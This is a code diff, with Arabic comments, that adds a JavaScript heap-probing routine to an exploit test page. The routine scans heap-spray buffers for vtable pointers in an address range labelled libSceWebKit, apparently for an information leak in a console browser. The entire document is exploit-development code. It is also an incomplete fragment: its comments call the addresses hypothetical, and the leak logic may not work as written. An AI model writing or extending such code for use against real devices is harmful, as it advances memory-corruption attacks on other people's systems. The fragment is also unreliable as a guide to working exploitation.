@@ -46,6 +46,32 @@
 
         // تشغيل الاختبار بعد تحميل الصفحة
         window.onload = runExploitProbe;
+        // دالة فحص الذاكرة (Memory Probe)
+async function probeMemoryForVTable() {
+    document.getElementById('status').innerText = "Probing Heap for VTable...";
+    
+    // نقوم بمسح مصفوفات الحشو للبحث عن قيم غير طبيعية (VTable pointers)
+    for (let i = 0; i < heapSpray.length; i++) {
+        let view = new DataView(heapSpray[i]);
+        
+        // محاولة قراءة أول 8 بايتات (مكان الـ VTable)
+        try {
+            let potentialVTable = view.getBigUint64(0, true);
+            
+            // نطاق عناوين libSceWebKit (نبحث عن عناوين في نطاق محدد)
+            // ملاحظة: هذه العناوين افتراضية ويجب مطابقتها مع الـ Offsets في بيئتك
+            if (potentialVTable > 0x100000000n && potentialVTable < 0x800000000n) {
+                console.log("Found potential VTable leak at index " + i + ": " + potentialVTable.toString(16));
+                document.getElementById('status').innerText = "VTable Leaked: " + potentialVTable.toString(16);
+                return; // تم العثور على التسريب
+            }
+        } catch (e) {
+            continue;
+        }
+    }
+    document.getElementById('status').innerText = "Probe Failed - Adjust Spray Geometry.";
+}
+
     </script>
 </body>
 </html>
